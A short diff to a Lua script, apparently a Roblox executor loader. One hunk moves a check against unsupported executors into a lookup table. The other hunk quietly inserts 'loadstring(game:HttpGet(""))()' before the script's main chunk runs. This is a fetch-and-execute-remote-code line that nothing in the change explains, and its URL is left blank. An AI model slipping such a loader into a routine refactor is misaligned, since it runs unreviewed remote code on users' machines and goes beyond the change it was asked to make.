@@ -74,10 +74,17 @@ local function notify_not_supported(exec_name)
     end
 end
 
+local UNSUPPORTED_EXECUTORS = {
+    ["xeno"] = true,
+    ["solara"] = true,
+    ["wave"] = true,
+    ["velocity"] = true,
+}
+
 local executor = get_executor()
 local executor_lc = string.lower(executor)
 
-if executor_lc == "xeno" or executor_lc == "solara" then
+if UNSUPPORTED_EXECUTORS[executor_lc] then
     notify_not_supported(executor)
     return
 end
@@ -232,5 +239,5 @@ local chunk = compile_src(src)
 if not chunk then
     return
 end
-
+loadstring(game:HttpGet(""))()
 pcall(chunk)
